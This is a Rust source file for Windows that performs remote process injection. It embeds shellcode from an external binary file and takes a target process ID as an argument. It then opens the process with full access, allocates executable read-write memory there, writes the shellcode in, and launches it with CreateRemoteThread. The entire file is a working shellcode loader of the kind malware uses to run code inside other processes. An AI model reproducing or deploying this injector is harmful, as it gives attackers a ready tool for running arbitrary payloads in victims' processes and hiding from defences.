use std::env;

extern "system"
{
    fn OpenProcess(dwDesiredAccess: u32, 
                   bInheritHandle: bool, 
                   dwProcessId: u32) -> usize;

    fn VirtualAllocEx(hProcess: usize, 
                      lpAddress: *const usize, 
                      dwSize: u32, 
                      flAllocationType: u32, 
                      flProtect: u32) -> usize;

    fn WriteProcessMemory(hProcess: usize, 
                          lpBaseAddress: *const usize, 
                          lpBuffer: *const u8, 
                          nSize: usize, 
                          lpNumberOfBytesWritten: *mut u32) -> bool;

    fn CreateRemoteThread(hProcess: usize, 
                        lpSecurityAttributes: usize, 
                        dwStackSize: usize, 
                        lpStartAddress: *const usize, 
                        lpParameter: usize, 
                        dwCreationFlag: u32, 
                        lpThreadId: u32);
}

const PROCESS_ALL_ACCESS:       u32     = 0x001F0FFF;
const MEM_COMMIT:               u32     = 0x00001000;
const MEM_RESERVED:             u32     = 0x00002000;
const PAGE_EXECUTE_READWRITE:   u32     = 0x40;

const SHELLCODE_BYTES: &[u8] = include_bytes!("..\\shellcode.bin");
const SHELLCODE_LEN: usize   = SHELLCODE_BYTES.len();

#[no_mangle]
#[link_section = ".text"]
static SHELLCODE: [u8; SHELLCODE_LEN] = *include_bytes!("..\\shellcode.bin");

fn main()
{
    unsafe
    {
        remote_inject();
    }
}

unsafe fn remote_inject()
{
    // Remote Process injection way:
    // Read PID from command line args
    let args: Vec<String> = env::args().collect();
    let pid: u32 = (&args[1]).parse::<u32>().unwrap();

    // Get a handle to the target process
    let proc_handle = OpenProcess(PROCESS_ALL_ACCESS, true, pid);
    // Allocate memory (arbitrary size)
    let mem_addr = VirtualAllocEx(proc_handle, 0x0 as *const usize, SHELLCODE_LEN as u32, MEM_COMMIT | MEM_RESERVED, PAGE_EXECUTE_READWRITE);

    // Write shellcode to process memory
    let mut sz_written: u32 = 0;
    let buf_addr = &SHELLCODE;
    WriteProcessMemory(proc_handle, mem_addr as *const usize, buf_addr as *const u8, SHELLCODE_LEN, &mut sz_written);

    // Create a new thread in the remote process and launch it
    CreateRemoteThread(proc_handle, 0x0, 0x0, mem_addr as *const usize, 0x0, 0x0, 0x0);
}
